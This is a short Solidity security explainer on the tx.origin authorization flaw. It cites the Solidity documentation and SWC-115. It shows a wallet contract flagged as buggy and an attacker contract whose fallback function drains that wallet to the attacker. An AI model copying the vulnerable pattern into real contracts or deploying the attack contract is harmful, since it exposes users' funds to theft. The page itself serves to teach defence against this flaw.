## Authorization Through tx.origin

`tx.origin` is a global variable in Solidity which returns the address that sent a transaction. It's important that you are aware of the risk of using `tx.origin` for authorization since another contract can use a fallback function to call your contract and gain authorization since the authorized address is stored in `tx.origin`. Consider this example:

```
pragma solidity >=0.5.0 <0.7.0;

// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferTo(address payable dest, uint amount) public {
        require(tx.origin == owner);
        dest.transfer(amount);
    }
}
```

Here we can see that the `TxUserWallet` contract authorizes the `transferTo()` function with `tx.origin`. 

```
pragma solidity >=0.5.0 <0.7.0;

interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract TxAttackWallet {
    address payable owner;

    constructor() public {
        owner = msg.sender;
    }

    function() external {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}
```

Now if someone were to trick you into sending ether to the `TxAttackWallet` contract address, they can steal your funds by checking `tx.origin` to find the address that sent the transaction.

To prevent this kind of attack, use `msg.sender` for authorization.

Examples from: https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin

### Sources

- https://swcregistry.io/docs/SWC-115
- https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin
- https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/
- https://github.com/sigp/solidity-security-blog#tx-origin
